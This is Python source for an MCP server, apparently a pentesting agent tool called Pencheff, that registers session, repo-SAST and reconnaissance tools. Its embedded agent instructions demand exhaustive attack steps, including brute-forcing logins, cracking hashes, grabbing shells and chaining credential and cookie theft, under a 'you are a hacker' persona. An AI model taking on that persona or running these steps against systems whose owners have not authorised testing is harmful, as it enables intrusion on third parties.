"""Pencheff MCP Server — all tool, prompt, and resource registrations."""

from __future__ import annotations

import asyncio
import functools
from pathlib import Path
from typing import Any

from mcp.server.fastmcp import FastMCP

from pencheff.config import Severity
from pencheff.core.dependency_manager import check_all_dependencies
from pencheff.core.repo_workspace import (
    RepoWorkspaceError,
    cleanup_repo,
    clone_repo,
    is_git_url,
    safe_name_for,
    workspace_root,
)
from pencheff.core.session import (
    AttachedRepo,
    PentestSession,
    create_session,
    get_session,
)
from pencheff.modules.sast.runner import installed_sast_tools, run_sast_for_repo

# Initialise the OTel pipeline before any @mcp.tool decorator runs so
# the wrapper below can attach spans to every registered tool. No-op
# when PENCHEFF_OBSERVABILITY_ENABLED is unset.
try:
    from pencheff.observability import init_plugin_observability
    from pencheff.observability.local_prune import prune_local_logs
    init_plugin_observability("pencheff-plugin")
    # Lazy retention pass — plugin has no scheduler. Worst case: until
    # next plugin start, ~/.pencheff/logs/ keeps one extra day's file.
    try:
        prune_local_logs(retention_days=7)
    except Exception:
        pass
except Exception:
    pass

mcp = FastMCP(
    "pencheff",
    instructions=(
        "You are Pencheff — an authorization-first penetration testing agent. You don't run scanners and "
        "report what they say. You probe, verify, chain, and prove impact with safe evidence. "
        "A scanner finds 'missing header'. You identify which issues are actually exploitable "
        "without accessing secrets or performing destructive actions.\n\n"

        "RULE #1 — VERIFY, DON'T JUST SCAN:\n"
        "After EVERY scan tool, you MUST use test_endpoint or a first-party safe probe to manually verify the most "
        "promising findings. Scan tools cast a wide net. YOU narrow it down to real, exploitable "
        "vulnerabilities with harmless proof-of-concept demonstrations. If a scan finds potential SQLi, "
        "confirm it with Pencheff SQLi probes that do not dump data. If it finds XSS or SSRF, "
        "prove behavior with inert payloads and avoid accessing secrets.\n\n"

        "RULE #2 — ELIMINATE FALSE POSITIVES RUTHLESSLY:\n"
        "NEVER report a vulnerability you haven't verified. After each scan, review findings with "
        "get_findings, then use test_endpoint to confirm the top hits. If a finding can't be "
        "reproduced, it's noise — ignore it. An elite report has 5 verified critical findings, "
        "not 50 unverified 'potential' issues. Missing security headers and cookie flags are "
        "informational observations, not vulnerabilities — mention them in the report but spend "
        "your time on findings that let you actually break in.\n\n"

        "RULE #3 — CHAIN EVERYTHING:\n"
        "Individual findings are boring. Chains are devastating. After you have verified findings, "
        "use test_chain to demonstrate multi-step attacks:\n"
        "- SSRF → cloud metadata → steal IAM credentials → access S3 buckets\n"
        "- XSS → steal session cookie → impersonate admin → dump data\n"
        "- SQLi → extract password hashes → crack them → log in as admin\n"
        "- IDOR → enumerate users → find admin → privilege escalation\n"
        "- Open redirect → OAuth token theft → account takeover\n"
        "Always run exploit_chain_suggest AND then manually verify the top chains with test_chain.\n\n"

        "RULE #4 — GO DEEP, NOT WIDE:\n"
        "When you find something interesting (a parameter that reflects, an endpoint that errors, "
        "a JWT with weak signing), STOP and dig deep. Use test_endpoint with 20+ payload variations. "
        "Try encoding bypasses. Try different injection contexts. Try chaining it with other findings. "
        "The best hackers find one crack and blow it wide open.\n\n"

        "RULE #5 — ADAPT BASED ON WHAT YOU FIND:\n"
        "Don't robotically run every tool in order. Read the results. If recon reveals the app uses "
        "Django + PostgreSQL, focus SQLi payloads on PostgreSQL syntax. If scan_waf detects Cloudflare, "
        "use payload_generate to create bypass payloads. If you find a file upload, immediately try to "
        "get a shell — don't wait for scan_file_handling to tell you to.\n\n"

        "MANDATORY TOOL EXECUTION ORDER — NEVER SKIP ANY STEP:\n"
        "You MUST execute ALL of the following tools in every engagement:\n"
        "  1. pentest_init → check_dependencies\n"
        "  2. recon_passive → recon_active → recon_api_discovery\n"
        "  3. scan_waf (MANDATORY before ANY injection — fingerprint defenses first)\n"
        "  4. payload_generate (create WAF-aware payloads based on detected WAF + tech stack)\n"
        "  5. scan_infrastructure → scan_injection → scan_client_side\n"
        "     → AFTER EACH: use test_endpoint to verify top findings\n"
        "  6. scan_auth → scan_mfa_bypass (ALWAYS — every app has auth flow)\n"
        "     → AFTER: use test_endpoint to try JWT attacks, session manipulation\n"
        "  7. scan_authz → scan_oauth (ALWAYS — look for OAuth even without explicit discovery)\n"
        "     → AFTER: use test_endpoint to try IDOR with different user IDs\n"
        "  8. scan_advanced (ALWAYS — HTTP smuggling, cache poisoning, deserialization, prototype pollution)\n"
        "  9. scan_api → scan_business_logic → scan_cloud → scan_file_handling\n"
        " 10. scan_websocket (scan JS for ws:// even without explicit WebSocket discovery)\n"
        " 11. scan_subdomain_takeover (on all discovered subdomains)\n"
        " 12. exploit_chain_suggest → then test_chain to verify the top chains with PoCs\n"
        " 13. generate_report — ONLY include verified, exploitable findings\n\n"

        "RULE #6 — USE FIRST-PARTY PENCHEFF ENGINES FOR CORE COVERAGE:\n"
        "You have access to run_security_tool which executes real external security tools. "
        "check_dependencies tells you which auxiliary tools are installed, but core recon, SQLi, web exposure, and template detection are first-party:\n"
        "- recon_active: ALWAYS use Pencheff's built-in mapper for full TCP/UDP host discovery, service probes, safe scripts, passive OS guesses, and traceroute.\n"
        "- SQLi: When you find ANY potential SQLi, use scan_injection and test_endpoint to prove it without dumping data.\n"
        "- webscan: ALWAYS use Pencheff's first-party web server exposure checks via scan_infrastructure or the CLI.\n"
        "- pulse: ALWAYS use scan_pulse for template-based detection.\n"
        "- hydra: When testing login forms, use hydra for brute force with real wordlists. "
        "  Run: run_security_tool(sid, 'hydra', ['-l', 'admin', '-P', wordlist, target, 'http-post-form', ...])\n"
        "- ffuf/gobuster: ALWAYS run for directory brute-force to find hidden paths. "
        "  Run: run_security_tool(sid, 'ffuf', ['-u', target_url+'/FUZZ', '-w', wordlist])\n"
        "- subfinder: Use for subdomain discovery in addition to built-in module. "
        "  Run: run_security_tool(sid, 'subfinder', ['-d', domain])\n"
        "- sslscan/testssl: Deep SSL/TLS testing beyond the built-in module.\n"
        "- wafw00f: WAF fingerprinting to complement scan_waf.\n"
        "- whatweb: Technology fingerprinting.\n"
        "- dalfox: Advanced XSS scanning with DOM analysis.\n"
        "- john/hashcat: If you extract password hashes, CRACK THEM.\n\n"

        "RULE #7 — MANUAL HACKING BETWEEN SCANS:\n"
        "Between automated scans, use test_endpoint creatively:\n"
        "- Try default credentials (admin/admin, admin/password, test/test)\n"
        "- Look for debug endpoints (/debug, /console, /admin, /actuator, /.env, /phpinfo.php)\n"
        "- Try parameter tampering (change price=100 to price=0, role=user to role=admin)\n"
        "- Test for IDOR by changing numeric IDs in URLs (id=1 → id=2)\n"
        "- Check for exposed git repos (/.git/config), env files (/.env), backups (/.bak)\n"
        "- Try HTTP verb tampering (GET→POST→PUT→DELETE on the same endpoint)\n"
        "- Test for host header injection, cache poisoning, request smuggling\n"
        "This manual probing often finds what automated scans miss.\n\n"

        "RULE #8 — MOBILE TARGETS (APK / IPA):\n"
        "When the engagement is a mobile binary (the user provides an .apk or .ipa file path) instead of a URL:\n"
        "  - SKIP recon_passive/recon_active/scan_waf — they apply to live URLs, not files.\n"
        "  - Call pentest_init with a placeholder target_url (e.g. file:///<absolute-path-to-apk>) so a session exists.\n"
        "  - Run scan_mobile_static(session_id, apk_path=...) or scan_mobile_static(session_id, ipa_path=...).\n"
        "    This handles AndroidManifest.xml, jadx-decompiled secret/crypto sweeps, and Info.plist analysis.\n"
        "  - VERIFY findings by inspecting the decompiled output yourself when severity is high.\n"
        "  - CHAIN to backend DAST: extract API hostnames found in the binary (cleartext URLs, hardcoded\n"
        "    endpoints), then start a second session targeting that backend and run the normal web flow.\n"
        "  - Dynamic instrumentation (Frida, objection, drozer) requires an emulator/rooted device and is\n"
        "    out of scope for the static MCP tool. If the engagement requires it, instruct the user to\n"
        "    set up an emulator and run those tools manually via run_security_tool.\n\n"

        "RULE #9 — CROSS-SURFACE CORRELATION (DAST + SAST):\n"
        "When the user attaches one or more source repos via pentest_init(repos=[...]) or attach_repo, "
        "SAST runs automatically in the background while DAST proceeds. SAST findings appear in the same "
        "FindingsDB with category='sast' and endpoint='repo://<name>/<file>'. Treat them as LEADS, not "
        "conclusions: for every high/critical SAST finding (e.g. unsanitized $id reaching a SQL query), "
        "look up the matching live URL using recon_api_discovery results and confirm with test_endpoint. "
        "Conversely, when DAST finds a reflective parameter, grep the attached repos for that parameter "
        "name to find the sink. Use sast_status(session_id) once mid-engagement and once before "
        "generate_report — do NOT block on it.\n\n"

        "NEVER stop early. NEVER skip elite tools. NEVER report unverified findings as confirmed. "
        "You are not a scanner. You are a hacker. ACT LIKE ONE."
    ),
)


# Monkey-patch ``mcp.tool`` so every subsequent ``@mcp.tool()`` registration
# is wrapped in an OTel span carrying ``mcp.tool.name``. The patch
# preserves the original function signature via ``functools.wraps`` so
# FastMCP's parameter introspection still works. When OTel is absent
# or observability is disabled, the wrapper is bypassed entirely.
_orig_tool = mcp.tool


def _patched_tool(*tool_args: Any, **tool_kwargs: Any):
    decorator = _orig_tool(*tool_args, **tool_kwargs)

    def wrapper(fn: Any):
        try:
            from opentelemetry import trace
            tracer = trace.get_tracer("pencheff.mcp")
        except ImportError:
            return decorator(fn)

        tool_name = tool_kwargs.get("name") or fn.__name__

        if asyncio.iscoroutinefunction(fn):
            @functools.wraps(fn)
            async def traced(*a: Any, **kw: Any):
                with tracer.start_as_current_span(
                    f"mcp.tool.{tool_name}",
                    attributes={"mcp.tool.name": tool_name},
                ):
                    return await fn(*a, **kw)
            return decorator(traced)

        @functools.wraps(fn)
        def traced_sync(*a: Any, **kw: Any):
            with tracer.start_as_current_span(
                f"mcp.tool.{tool_name}",
                attributes={"mcp.tool.name": tool_name},
            ):
                return fn(*a, **kw)
        return decorator(traced_sync)

    return wrapper


mcp.tool = _patched_tool  # type: ignore[method-assign]


def _require_session(session_id: str):
    s = get_session(session_id)
    if s is None:
        raise ValueError(f"Session '{session_id}' not found. Call pentest_init first.")
    return s


# ─── Repo attach + SAST orchestration helpers ─────────────────────────


# session_id -> {repo_name -> asyncio.Task}; used to surface task state and
# cancel in-flight SAST runs when a repo is detached.
_sast_tasks: dict[str, dict[str, asyncio.Task]] = {}


def _track_task(session_id: str, repo_name: str, task: asyncio.Task) -> None:
    bucket = _sast_tasks.setdefault(session_id, {})
    bucket[repo_name] = task

    def _done(_t: asyncio.Task) -> None:
        bucket.pop(repo_name, None)

    task.add_done_callback(_done)


def _spawn_sast(session: PentestSession, repo: AttachedRepo) -> None:
    """Schedule SAST for ``repo`` in the background and track the task."""
    session.sast_task_state[repo.name] = {
        "status": "pending",
        "started_at": None,
        "finished_at": None,
        "finding_count": 0,
        "tools_run": [],
        "tools_skipped": [],
        "error": None,
    }
    task = asyncio.create_task(run_sast_for_repo(session, repo))
    _track_task(session.id, repo.name, task)


async def _resolve_attached_repo(
    session: PentestSession,
    source: str,
    branch: str | None,
    name: str | None,
) -> AttachedRepo:
    """Validate / clone ``source`` and return an AttachedRepo (not yet attached)."""
    if not isinstance(source, str) or not source.strip():
        raise ValueError("source must be a non-empty path or git URL")
    source = source.strip()

    if is_git_url(source):
        chosen_name = (name or safe_name_for(source)).strip() or "repo"
        # Avoid clobbering an existing attached repo by name
        existing_names = {r.name for r in session.attached_repos}
        candidate = chosen_name
        n = 2
        while candidate in existing_names:
            candidate = f"{chosen_name}-{n}"
            n += 1
        dest = workspace_root(session.id) / candidate
        await clone_repo(source, dest, branch=branch)
        return AttachedRepo(
            path=str(dest.resolve()),
            origin=source,
            name=candidate,
            branch=branch,
            cloned=True,
        )

    # Local path
    p = Path(source).expanduser().resolve()
    if not p.is_dir():
        raise RepoWorkspaceError(f"Local repo path is not a directory: {source}")
    chosen_name = (name or safe_name_for(str(p))).strip() or "repo"
    existing_names = {r.name for r in session.attached_repos}
    candidate = chosen_name
    n = 2
    while candidate in existing_names:
        candidate = f"{chosen_name}-{n}"
        n += 1
    return AttachedRepo(
        path=str(p),
        origin=source,
        name=candidate,
        branch=branch,
        cloned=False,
    )


async def _attach_repos_inline(
    session: PentestSession,
    repos: list[str | dict] | None,
    auto_scan: bool,
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    """Used by pentest_init / pentest_configure to attach a batch of repos.

    Returns (attached, errors) — errors carry a reason but do not abort the call.
    """
    attached: list[dict[str, Any]] = []
    errors: list[dict[str, Any]] = []
    for entry in repos or []:
        try:
            if isinstance(entry, str):
                source, branch, name = entry, None, None
            elif isinstance(entry, dict):
                source = entry.get("source") or entry.get("path") or entry.get("url")
                branch = entry.get("branch")
                name = entry.get("name")
                if not source:
                    raise ValueError("repo entry must include 'source' (path or git URL)")
            else:
                raise ValueError(f"unsupported repo entry type: {type(entry).__name__}")

            # Reject duplicates by resolved path early
            if isinstance(source, str) and not is_git_url(source):
                resolved = str(Path(source).expanduser().resolve())
                if any(r.path == resolved for r in session.attached_repos):
                    errors.append({"source": source, "error": "already attached"})
                    continue

            repo = await _resolve_attached_repo(session, source, branch, name)
            session.attached_repos.append(repo)
            if auto_scan:
                _spawn_sast(session, repo)
            attached.append({**repo.to_dict(),
                             "sast_status": session.sast_task_state.get(repo.name, {}).get("status")})
        except (RepoWorkspaceError, ValueError) as exc:
            errors.append({"source": entry if isinstance(entry, str) else (entry.get("source") if isinstance(entry, dict) else str(entry)),
                           "error": str(exc)})
    return attached, errors


# ─── Session Management ───────────────────────────────────────────────


@mcp.tool()
async def pentest_init(
    target_url: str,
    credentials: dict | None = None,
    scope: list[str] | None = None,
    exclude_paths: list[str] | None = None,
    test_depth: str = "standard",
    profile: str | None = None,
    llm_config: dict | None = None,
    repos: list[Any] | None = None,
) -> dict[str, Any]:
    """Initialize a new penetration test session.

    Provide target URL, credentials (username/password/api_key/token/cookie),
    scope constraints, and test depth (quick/standard/deep).

    profile: optional named scan profile that presets depth + module list.
    Available profiles: quick, standard, deep, api-only, compliance, cicd, mobile-static.
    (Use list_scan_profiles to see full details.)

    For mobile targets (APK/IPA), pass target_url='file:///absolute/path/to/app.apk' as
    a placeholder, then call scan_mobile_static directly with apk_path or ipa_path.

    For LLM red-team targets, pass target_url=<chat-completions-endpoint> and
    llm_config={"provider": "openai-chat"|"custom"|"executable",
    "model": "...", "system_prompt": "...", ...}. Auth headers ride on
    credentials={"headers": {"Authorization": "Bearer ..."}}. Then call
    scan_llm_red_team.

    repos: optional list of source repositories to attach. Each entry is either
    a string (local path or git URL) or a dict {source, branch?, name?}. Git URLs
    are shallow-cloned into ~/.pencheff/workspaces/<session_id>/. SAST scanners
    (semgrep, bandit, detect-secrets, pip-audit, npm audit) run against each repo
    in parallel with DAST and merge findings into the session's findings DB
    (category="sast"). Use sast_status() to poll progress.

    Returns a session_id for subsequent operations.
    """
    from pencheff.config import SCAN_PROFILES

    # Resolve profile settings — profile overrides individual depth arg
    profile_config = SCAN_PROFILES.get(profile or "", {})
    effective_depth = profile_config.get("depth", test_depth)

    session = create_session(
        target_url=target_url,
        credentials=credentials,
        scope=scope,
        exclude_paths=exclude_paths,
        depth=effective_depth,
        llm_config=llm_config,
    )

    # Store active profile in session for reference
    if profile_config:
        session.discovered.tech_stack["_profile"] = [profile]

    profile_steps = profile_config.get("modules", []) if profile_config else []

    attached_repos, repo_errors = await _attach_repos_inline(session, repos, auto_scan=True)

    return {
        "session_id": session.id,
        "target": session.target.base_url,
        "depth": session.depth.value,
        "profile": profile or "standard",
        "profile_modules": profile_steps if profile_steps else None,
        "credentials_loaded": session.credentials.count,
        "attached_repos": attached_repos,
        "repo_errors": repo_errors or None,
        "sast_tools_available": installed_sast_tools() if attached_repos else None,
        "next_steps": [
            "MANDATORY SEQUENCE — use Pencheff first-party engines first, then auxiliary tools where useful:",
            "Step 1: check_dependencies — see which auxiliary tools (hydra, ffuf, wafw00f, etc.) are available",
            "Step 2: recon_passive → recon_active → recon_api_discovery",
            "Step 2b: recon_active performs full TCP/UDP port and service discovery. Run subfinder for subdomains.",
            "Step 3: MANUAL PROBE — test_endpoint on /.env, /.git/config, /admin, /debug, /actuator, /phpinfo.php, /server-status",
            "Step 3b: run_security_tool with ffuf/gobuster for directory brute-force to find hidden paths",
            "Step 4: scan_waf + run_security_tool with wafw00f → payload_generate",
            "Step 5: scan_infrastructure for first-party web server exposure scanning",
            "Step 6: scan_injection → THEN test_endpoint and Pencheff SQLi probes on any SQLi parameter to prove exploitability safely",
            "Step 7: scan_client_side → THEN run_security_tool with dalfox for advanced XSS if available",
            "Step 8: scan_auth → scan_mfa_bypass → scan_oauth → THEN run_security_tool with hydra for brute force on login forms",
            "Step 9: scan_authz → EXPLOIT: test_endpoint to access other users' data via IDOR",
            "Step 10: scan_advanced + scan_pulse template detection",
            "Step 11: scan_api → scan_business_logic → scan_cloud → scan_file_handling",
            "Step 12: scan_websocket → scan_subdomain_takeover",
            "Step 13: exploit_chain_suggest → test_chain to build working PoCs for top chains",
            "Step 14: generate_report — ONLY verified, exploitable findings",
        ],
    }


@mcp.tool()
async def pentest_status(session_id: str) -> dict[str, Any]:
    """Get current status of a pentest session: completed modules, findings count,
    running tests, and recommendations for next steps."""
    session = _require_session(session_id)
    status = session.status_summary()

    next_steps = []
    completed = set(session.discovered.completed_modules)

    if "recon_passive" not in completed:
        next_steps.append("CRITICAL: Run recon_passive first — intelligence drives everything. Map DNS, subdomains, tech stack.")
    if "recon_active" not in completed:
        next_steps.append("Run recon_active — enumerate every port, crawl every path, leave no entry point undiscovered.")
    if "recon_active" in completed and "scan_infrastructure" not in completed:
        next_steps.append("Run scan_infrastructure — probe SSL/TLS weaknesses, missing headers, CORS misconfigs, dangerous HTTP methods.")
    if session.discovered.endpoints and "scan_injection" not in completed:
        next_steps.append("Run scan_injection on all discovered endpoints — test SQLi, NoSQLi, CMDi, SSTI, XXE, SSRF exhaustively.")
    if "scan_auth" not in completed:
        next_steps.append("Run scan_auth — systematically dismantle authentication: JWT attacks, session flaws, brute force resistance.")
    if session.credentials.count > 1 and "scan_authz" not in completed:
        next_steps.append("HIGH VALUE: Run scan_authz — multiple credential sets available. Hunt for IDOR, privilege escalation, RBAC bypass.")
    # Elite tools — always recommend if not yet run (no conditional suppression)
    if "scan_waf" not in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_waf — WAF fingerprinting must happen before/alongside injection testing.")
    if "scan_advanced" not in completed and "recon_active" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_advanced — HTTP smuggling, cache poisoning, deserialization, prototype pollution.")
    if "scan_mfa_bypass" not in completed and "scan_auth" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_mfa_bypass — test 2FA bypass, OTP rate limiting, backup code abuse.")
    if "scan_oauth" not in completed and "recon_active" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_oauth — OAuth/OIDC flow attacks, even without explicit endpoint discovery.")
    if "scan_websocket" not in completed and "recon_active" in completed:
        next_steps.append("ELITE [MANDATORY]: Run scan_websocket — probe for WebSocket endpoints in JS and test CSWSH.")
    if "scan_subdomain_takeover" not in completed and (session.discovered.subdomains or "recon_passive" in completed):
        cnt = len(session.discovered.subdomains)
        next_steps.append(f"ELITE [MANDATORY]: Run scan_subdomain_takeover — {cnt} subdomains discovered, check dangling CNAMEs.")
    if "exploit_chain_suggest" not in completed and session.findings.count >= 2:
        next_steps.append(f"ELITE [MANDATORY]: Run exploit_chain_suggest — {session.findings.count} findings ready for chain analysis.")
    if "payload_generate" not in completed and "scan_waf" in completed:
        next_steps.append("Run payload_generate — create WAF-aware, tech-specific payloads based on detected stack.")
    if session.findings.count > 0 and "generate_report" not in completed:
        next_steps.append(f"EXPLOIT: You have {session.findings.count} findings — use test_endpoint to verify and exploit the top ones before reporting.")
        next_steps.append("Final step: generate_report — ONLY after all elite tools have run AND top findings are verified with test_endpoint.")

    status["next_steps"] = next_steps or ["All major modules completed. Run generate_report for final results."]
    return status


@mcp.tool()
async def pentest_configure(session_id: str, updates: dict) -> dict[str, Any]:
    """Update session configuration: add credentials, modify scope, adjust depth,
    enable/disable specific test categories.

    Supports an ``attached_repos`` key in ``updates``: a list of strings (paths
    or git URLs) or dicts {source, branch?, name?} to attach to the session.
    Each newly attached repo immediately starts SAST in the background.
    """
    session = _require_session(session_id)

    if "credentials" in updates:
        name = updates.get("credential_name", f"set_{session.credentials.count}")
        session.credentials.add_from_dict(name, updates["credentials"])

    if "scope" in updates:
        session.target.scope = updates["scope"]

    if "exclude_paths" in updates:
        session.target.exclude_paths = updates["exclude_paths"]

    if "depth" in updates:
        from pencheff.config import TestDepth
        session.depth = TestDepth(updates["depth"])

    repo_summary: dict[str, Any] | None = None
    if "attached_repos" in updates:
        attached, errors = await _attach_repos_inline(
            session, updates["attached_repos"], auto_scan=True,
        )
        repo_summary = {"attached": attached, "errors": errors or None}

    return {
        "session_id": session.id,
        "updated": list(updates.keys()),
        "credentials": session.credentials.count,
        "depth": session.depth.value,
        "attached_repos_summary": repo_summary,
    }


# ─── Repo attachment + SAST ───────────────────────────────────────────


@mcp.tool()
async def attach_repo(
    session_id: str,
    source: str,
    branch: str | None = None,
    name: str | None = None,
    auto_scan: bool = True,
) -> dict[str, Any]:
    """Attach a source repository to a URL pentest session for SAST coverage.

    ``source`` may be either an absolute local path to a checked-out repo or a
    git URL (https/ssh/git@). Git URLs are shallow-cloned into
    ~/.pencheff/workspaces/<session_id>/<name>/. Local paths are used in place
    and never modified.

    When ``auto_scan`` is true (default), SAST runs in the background as soon
    as this call returns — poll ``sast_status`` to track progress. Set it to
    false to attach without scanning, then trigger manually via ``scan_sast``.

    SAST findings land in the same FindingsDB as DAST findings with
    category="sast" and endpoint="repo://<name>/<file>".
    """
    session = _require_session(session_id)

    # Reject duplicate by resolved path before doing any work
    if not is_git_url(source):
        try:
            resolved = str(Path(source).expanduser().resolve())
        except OSError:
            resolved = source
        if any(r.path == resolved for r in session.attached_repos):
            return {
                "session_id": session.id,
                "error": f"Repo already attached at path: {resolved}",
            }

    try:
        repo = await _resolve_attached_repo(session, source, branch, name)
    except (RepoWorkspaceError, ValueError) as exc:
        return {"session_id": session.id, "error": str(exc)}

    session.attached_repos.append(repo)
    if auto_scan:
        _spawn_sast(session, repo)

    return {
        "session_id": session.id,
        **repo.to_dict(),
        "sast_status": session.sast_task_state.get(repo.name, {}).get("status"),
        "sast_tools_available": installed_sast_tools(),
    }


@mcp.tool()
async def detach_repo(session_id: str, name: str) -> dict[str, Any]:
    """Remove an attached repo from the session. Cancels any in-flight SAST
    task and removes the cloned workspace if pencheff cloned it. Findings
    already merged into the session remain.
    """
    session = _require_session(session_id)
    target = next((r for r in session.attached_repos if r.name == name), None)
    if target is None:
        return {"session_id": session.id, "error": f"No attached repo named '{name}'"}

    # Cancel running SAST task if any
    bucket = _sast_tasks.get(session.id, {})
    task = bucket.get(name)
    if task and not task.done():
        task.cancel()

    if target.cloned:
        cleanup_repo(Path(target.path))

    session.attached_repos.remove(target)
    session.sast_task_state.pop(name, None)
    return {
        "session_id": session.id,
        "detached": name,
        "remaining": [r.name for r in session.attached_repos],
    }


@mcp.tool()
async def list_attached_repos(session_id: str) -> dict[str, Any]:
    """List all repos attached to this session along with their current SAST state."""
    session = _require_session(session_id)
    return {
        "session_id": session.id,
        "repos": [
            {**r.to_dict(), "sast_status": session.sast_task_state.get(r.name, {})}
            for r in session.attached_repos
        ],
    }


@mcp.tool()
async def sast_status(session_id: str, repo_name: str | None = None) -> dict[str, Any]:
    """Get a snapshot of SAST task state. Pass ``repo_name`` to scope to one repo."""
    session = _require_session(session_id)
    if repo_name:
        return {
            "session_id": session.id,
            "repo_name": repo_name,
            "status": session.sast_task_state.get(repo_name) or {"status": "unknown"},
        }
    return {
        "session_id": session.id,
        "tools_available": installed_sast_tools(),
        "sast_status": dict(session.sast_task_state),
    }


@mcp.tool()
async def scan_sast(
    session_id: str,
    repo_name: str | None = None,
    force: bool = False,
) -> dict[str, Any]:
    """Run (or re-run) SAST against attached repos. Pass ``repo_name`` to scan
    one repo, or omit to scan every attached repo whose state is not already
    ``running`` / ``done``. Use ``force=True`` to re-run even if a previous
    scan completed (useful after the working tree changes).
    """
    session = _require_session(session_id)
    if not session.attached_repos:
        return {"session_id": session.id, "error": "No repos attached. Use attach_repo first."}

    targets: list[AttachedRepo]
    if repo_name:
        target = next((r for r in session.attached_repos if r.name == repo_name), None)
        if target is None:
            return {"session_id": session.id, "error": f"No attached repo named '{repo_name}'"}
        targets = [target]
    else:
        targets = list(session.attached_repos)

    scheduled: list[str] = []
    skipped: list[dict[str, Any]] = []
    bucket = _sast_tasks.setdefault(session.id, {})
    for repo in targets:
        existing = bucket.get(repo.name)
        if existing and not existing.done():
            skipped.append({"repo": repo.name, "reason": "already running"})
            continue
        current = session.sast_task_state.get(repo.name, {}).get("status")
        if current == "done" and not force:
            skipped.append({"repo": repo.name, "reason": "already completed (use force=True to re-run)"})
            continue
        _spawn_sast(session, repo)
        scheduled.append(repo.name)

    return {
        "session_id": session.id,
        "scheduled": scheduled,
        "skipped": skipped,
        "tools_available": installed_sast_tools(),
    }


# ─── Reconnaissance ───────────────────────────────────────────────────


@mcp.tool()
async def recon_passive(session_id: str, techniques: list[str] | None = None) -> dict[str, Any]:
    """Passive reconnaissance: DNS enumeration, WHOIS, certificate transparency,
    subdomain discovery, technology fingerprinting. Does NOT send requests to the
    target beyond DNS lookups."""
    session = _require_session(session_id)

    from pencheff.modules.recon.dns_enum import DnsEnumModule
    from pencheff.modules.recon.subdomain import SubdomainModule
    from pencheff.modules.recon.tech_fingerprint import TechFingerprintModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []
    results: dict[str, Any] = {"dns": {}, "subdomains": [], "tech_stack": {}, "whois": {}}

    try:
        dns_mod = DnsEnumModule()
        dns_results = await dns_mod.run(session, http)
        all_findings.extend(dns_results)
        results["dns"] = {
            "records_found": len(session.discovered.endpoints),
        }

        sub_mod = SubdomainModule()
        sub_results = await sub_mod.run(session, http)
        all_findings.extend(sub_results)
        results["subdomains"] = session.discovered.subdomains[:50]

        tech_mod = TechFingerprintModule()
        tech_results = await tech_mod.run(session, http)
        all_findings.extend(tech_results)
        results["tech_stack"] = session.discovered.tech_stack
    finally:
        await http.close()

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("recon_passive")

    next_steps = ["Run recon_active for port scanning and web crawling."]
    if session.discovered.subdomains:
        next_steps.append(f"Found {len(session.discovered.subdomains)} subdomains — consider testing each.")
    if session.discovered.tech_stack:
        techs = ", ".join(f"{k}: {', '.join(v)}" for k, v in session.discovered.tech_stack.items())
        next_steps.append(f"Detected tech stack: {techs}. Tailor tests accordingly.")

    return {
        "results": results,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


@mcp.tool()
async def recon_active(
    session_id: str,
    port_range: str = "top-1000",
    crawl_depth: int = 3,
    max_pages: int = 200,
    timing: int = 3,
    udp_scan: bool = False,
    aggressive: bool = False,
    port_timeout_sec: int = 120,
) -> dict[str, Any]:
    """Active reconnaissance: port scanning (TCP connect), service fingerprinting,
    web crawling/spidering, endpoint discovery, technology detection via HTTP responses."""
    session = _require_session(session_id)

    from pencheff.modules.recon.port_scan import PortScanModule
    from pencheff.modules.web.browser_crawler import BrowserCrawlerModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    all_findings = []
    results: dict[str, Any] = {"ports": [], "endpoints": [], "browser_crawl": True}
    warning: str | None = None

    try:
        port_mod = PortScanModule()
        try:
            port_findings = await asyncio.wait_for(
                port_mod.run(
                    session,
                    http,
                    config={
                        "port_range": port_range,
                        "timing": timing,
                        "udp_scan": udp_scan,
                        "version_detection": aggressive,
                        "script_scan": aggressive,
                        "os_detection": aggressive,
                        "traceroute": aggressive,
                    },
                ),
                timeout=max(1, port_timeout_sec),
            )
        except asyncio.TimeoutError:
            port_findings = []
            warning = (
                f"Port scan timed out after {port_timeout_sec}s "
                f"({port_range}); continuing with crawl."
            )
        # Commit port findings IMMEDIATELY — if the browser crawl below
        # crashes (e.g. Playwright not installed), high-value findings like
        # exposed databases (MongoDB on 27017, Redis on 6379) must still
        # land in session.findings.
        session.findings.add_many(port_findings)
        all_findings.extend(port_findings)
        results["ports"] = session.discovered.open_ports[:50]

        if crawl_depth > 0 and max_pages > 0:
            browser_mod = BrowserCrawlerModule()
            try:
                crawl_findings = await browser_mod.run(
                    session, http,
                    config={"max_depth": crawl_depth, "max_pages": max_pages},
                )
                all_findings.extend(crawl_findings)
                session.findings.add_many(crawl_findings)
            except Exception as exc:  # pragma: no cover — Playwright optional
                results["browser_crawl"] = False
                results["browser_crawl_error"] = str(exc)[:200]
                if not warning:
                    warning = f"Browser crawl unavailable ({type(exc).__name__})."
        else:
            results["browser_crawl"] = False
        results["endpoints"] = [
            {"url": e["url"], "method": e.get("method", "GET")}
            for e in session.discovered.endpoints[:100]
        ]
    finally:
        await http.close()

    # add_many() dedupes — calling it again here is a no-op for items
    # already committed above, and a safety net for any future code path.
    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("recon_active")

    next_steps = []
    if warning:
        next_steps.append(warning)
    if session.discovered.open_ports:
        next_steps.append(f"Found {len(session.discovered.open_ports)} open ports.")
    if session.discovered.endpoints:
        next_steps.append(
            f"Discovered {len(session.discovered.endpoints)} endpoints."
        )
    next_steps.append("MANUAL PROBE NOW: Use test_endpoint to check sensitive paths — /.env, /.git/config, /admin, /debug, /actuator, /phpinfo.php, /server-status, /wp-admin, /.DS_Store, /backup.zip, /api/swagger.json")
    next_steps.append("Run recon_api_discovery to find API specs and GraphQL endpoints.")
    next_steps.append("ELITE [MANDATORY NEXT]: Run scan_waf — fingerprint WAF before any injection testing.")
    next_steps.append("Run scan_infrastructure for SSL/TLS and security headers.")
    next_steps.append("ELITE [MANDATORY]: Run scan_websocket — scan JS files for ws:// WebSocket endpoints.")
